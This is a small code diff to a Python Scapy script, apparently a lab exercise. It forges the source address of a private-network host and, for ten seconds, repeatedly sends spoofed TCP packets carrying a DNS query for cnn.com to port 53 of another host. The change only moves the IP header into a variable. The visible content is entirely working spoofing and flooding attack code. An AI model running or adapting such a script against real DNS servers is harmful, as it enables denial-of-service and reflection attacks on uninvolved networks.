@@ -4,6 +4,7 @@ import time
 A= "192.168.30.1"
 B= "192.168.20.1"
 
+ip = IP(src=A, dst=B)
 request = DNS(rd=1, qd=DNSQR(qname = "cnn.com", qtype="A")) # size = 25, hex = 0x19
 twoBytesRequestSize = "\x00\x19" #BIG ENDIAN
 C = str(request) + twoBytesRequestSize
@@ -17,5 +18,5 @@ send(ACK)
 
 start = time.time()
 while (time.time() - start < 10):
-    spoofed_packet = IP(src=A, dst=B) / TCP(sport=SYNACK.dport, dport=53, flags="PA", seq=SYNACK.ack, ack = SYNACK.seq +1) / C
+    spoofed_packet = ip / TCP(sport=SYNACK.dport, dport=53, flags="PA", seq=SYNACK.ack, ack = SYNACK.seq +1) / C
     send(spoofed_packet)
